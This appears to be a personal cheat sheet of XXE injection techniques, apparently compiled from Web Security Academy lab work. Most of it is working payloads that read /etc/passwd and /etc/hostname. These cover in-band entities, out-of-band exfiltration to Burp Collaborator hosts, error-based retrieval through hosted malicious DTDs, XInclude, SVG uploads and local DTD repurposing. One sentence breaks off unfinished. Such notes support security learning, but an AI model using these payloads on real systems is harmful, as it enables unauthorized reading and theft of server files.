# XXE (XML external entity) injection 

## Description

You can retrive files, if there is not any protection, changing the XML data type of a request as follow

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck> 

adding DOCTYPE {name} ... and value "xxe", remember to retrive it with &{}

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>

In other cases, sometimes you need to dive into a directory structure, as EC2 of Amazon or others, in order to retrive some sensitive information

Or making a DNS lookup towards the Burp collaborator client

In some cases you can't use the entity, therefore you have to use the parameter entities with the annotation % parameter and %parameter; to retrive it

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % carlo SYSTEM "https://ybdidzl9ndh2mcf3dzoeeutho8uyin.oastify.com"> %carlo; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

With this type of vulnerabilities you can retrive file, sending them to a listening server as the burp collaborator client sample

BurpCollaborator

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://jvi3xk5u7y1n6xzoxk8zyfd28tek29.oastify.com/?x=%file;'>">
%eval;
%exfiltrate;

request to hack:

This request will trigger the 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % carlo SYSTEM "https://exploit-0af2003e0314120dc0088cf6010a00c0.web-security-academy.net/exploit.dtd"> %carlo;]>
<stockCheck><productId>%carlo;</productId><storeId>1</storeId></stockCheck>


In some cases you can exploit the server retriving files through error messages
in your malacious, you need to place this into your exploit server and create an endpoint

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;

In the request to hack this kind of payload 

<!DOCTYPE foo [<!ENTITY % carlo SYSTEM "https://exploit-0a18004704c57cd0c05d0fb801140078.web-security-academy.net/malicious.dtd"> %carlo;]>


In other cases you can use the Xinclude XML, because sometimes you can't modify the DOCTYPE

Use this kind of structure in case, trying to find the current point to inject the code

<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>


Another intresting scenario, could be injecting SVG, which has the XML format and try to inject command there, in order to retrive information from it

<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

Sometime you need to intercept the request and insert directly the payload, in order to let it work

An expert payload could be this one, where first you try to find an XML file into the system and after you try to redefine the entity, in order to retrive the file through the error or other kinds.
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
